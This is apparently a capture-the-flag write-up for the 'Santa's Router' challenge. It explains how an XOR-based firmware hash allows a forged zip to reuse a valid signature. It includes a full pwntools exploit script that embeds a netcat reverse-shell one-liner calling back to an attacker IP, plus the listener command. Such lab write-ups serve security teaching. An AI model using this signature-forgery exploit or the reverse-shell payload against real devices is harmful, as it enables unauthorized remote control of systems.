# [HV23.13] Santa's Router

## Introduction

Difficulty: Medium<br>
Author: Fabi_07

Santa came across a weird service that provides something with signatures of a firmware. He isn't really comfortable with all that crypto stuff, can you help him with this?

## Solution

A router with firmware update capabilities, how nice of Santa.

After checking the source code for some time, I realized that the `hasFile` function, had a serious flaw, it always `XOR`'ed 8-byte chunks to the current hash.

```py
def hashFile(fileContent:bytes) -> int:
    hash = 0
    for i in range(0, len(fileContent), 8):
        hash ^= sum([fileContent[i+j] << 8*j for j in range(8) if i+j < len(fileContent)])
    return hash
```

This means we can craft a zip archive, pad it to `// 8` and then add the 8 bytes of "hash difference" with swapped endianess to the zip file.

```py
import base64
import io
import zipfile
from pwn import *
from chall import hashFile

HOST = "152.96.15.2"
PORT = 1337
script = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.13.0.10 4444 >/tmp/f"

script_file = io.BytesIO(script.encode("utf-8"))
zip_file = io.BytesIO()
with zipfile.ZipFile(zip_file, 'w', zipfile.ZIP_DEFLATED) as archive:
    archive.writestr('start.sh', script_file.getvalue())

zip_bytes = zip_file.getvalue()
if len(zip_bytes) % 8 != 0:
    zip_bytes = zip_bytes + b"\x00" * (8 - (len(zip_bytes) % 8))

original_hash = hashFile(open('santas-router-source/firmware.zip', 'rb').read()).to_bytes(8)
cur_hash = hashFile(zip_bytes).to_bytes(8)
append_data = b''.join([(t^p).to_bytes(1) for t, p in zip(original_hash, cur_hash)])[::-1]
zip_bytes += append_data
encoded_zip = base64.b64encode(zip_bytes)

conn = remote(HOST, PORT)

conn.recvuntil(b"$ ")
conn.sendline(b"version")
version_line = conn.recvuntil(b"$ ")
signature = version_line.strip().splitlines()[0].split()[-1]
conn.sendline(b"update")
conn.recvuntil(b"> ")
conn.sendline(encoded_zip)
conn.recvuntil(b"> ")
conn.sendline(signature)
data = conn.recvuntil(b"$ ").splitlines()[0]
status_code = int(data.split()[-1])
success(f"{data.splitlines()[0].decode()} {chr(status_code)}")
conn.close()
```

Open up a listener using `nc -nvlp 4444`

The script gives us a reverse shell after executing, we can now print the flag.

Flag: `HV23{wait_x0r_is_not_a_secure_hash_function}`